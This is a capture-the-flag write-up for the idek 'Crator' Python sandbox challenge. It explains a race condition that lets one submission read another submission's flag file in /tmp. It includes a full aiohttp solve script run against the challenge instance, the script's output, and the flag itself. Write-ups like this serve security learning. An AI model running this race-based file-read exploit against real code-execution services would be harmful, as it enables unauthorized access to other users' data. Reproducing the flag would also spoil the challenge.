---
ai_date: 2025-04-27 05:18:29
ai_summary: Exploited race condition to read previous submission's flag by predicting and targeting its ID
ai_tags:
  - race
  - file-read
  - rce
created: 2024-08-17T21:27
points: 257
solves: 63
updated: 2025-07-14T09:46
---

Yet-Another-Python-Sandbox-Or-Is-It?
## problem

- Sandboxed python again?
- We are allowed to read files, just not the `/tmp/[id].expected` file which contains the flag.

But each submission is only forbidden from accessing their own `.expected` file, what if we read it from a previous submission?

## solution

Submit a dummy lagging code, it will pass the first test case and hang on the second one. We will predict its id and store it as `I`.

There will be a ~1s window where `/tmp/{I}.expected` will contain the flag.

```python [lag_machine.py]
i = input()
if "Welcome to Crator" not in i:
    for i in range(10**9):
        print(i)
else:
    print(i)
```

While the request is happening, send multiple new submissions each trying to read the file `/tmp/{I}.expected`, and print the results.

The sandboxed `open` only checks for 1 id, so they will be able to read the file without issue.

```python
w = True # print 1 instance of 'Welcome...' for sanity purpose
for i in range(10**9):
    try:
        with open("/tmp/{target}.expected") as f:
            r = f.read()
            if 'Welcome' not in r or w:
                print(r,flush=True)
                w=False
    except Exception as e: # handle file not exist issues
        pass
```

Yes, there is no sandbox breakout, just some race condition.
## solve script

```python [solve.py]
import re
import time
import aiohttp
import asyncio


sid = 0
t = 'https://crator-2de64099b8890ab7.instancer.idek.team'

lagging_code = '''
i = input()
if "Welcome to Crator" not in i:
    for i in range(10**9):
        print(i)
else:
    print(i)
'''


async def init(s):
    global sid
    await s.post(f"{t}/register", data={'username': 'kumo', 'password': 'kumo'})
    await s.post(f"{t}/login", data={'username': 'kumo', 'password': 'kumo'})
    r = await s.post(f"{t}/submit/helloinput", data={'code': 'print("hello")'}, allow_redirects=True)
    sid = int(str(r.url).split('/')[-1])
    sid += 1


async def thief(s, target, delay=0):
    time.sleep(delay)
    r = await s.post(f"{t}/submit/helloinput", data={'code': f'''
w = True
for i in range(10**9):
    try:
        with open("/tmp/{target}.expected") as f:
            r = f.read()
            if 'Welcome' not in r or w:
                print(r,flush=True)
                w=False
    except Exception as e:
        pass'''})
    text = await r.text()
    if 'idek{' in text:
        print(re.search(r'idek{(.*)}', text).group(0))


async def attack_chain(s):
    global sid
    jobs = []
    jobs.append(s.post(f"{t}/submit/helloinput", data={'code': lagging_code}))
    for i in range(5):
        jobs.append(thief(s, sid, i/10))
    await asyncio.gather(*jobs)
    print("chain executed", sid, '..', sid+5, t)
    sid += 6


async def main():
    global sid
    async with aiohttp.ClientSession() as s:
        await init(s)
        await attack_chain(s)

asyncio.run(main())
```

```sh
$ python solve.py
idek{1m4g1n3_n0t_h4v1ng_pr0p3r_s4ndb0x1ng}
idek{1m4g1n3_n0t_h4v1ng_pr0p3r_s4ndb0x1ng}
chain executed 2 .. 7 https://crator-2de64099b8890ab7.instancer.idek.team
```

```flag
idek{1m4g1n3_n0t_h4v1ng_pr0p3r_s4ndb0x1ng}
```